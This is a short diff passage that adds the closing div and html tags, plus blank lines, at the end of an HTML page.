+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
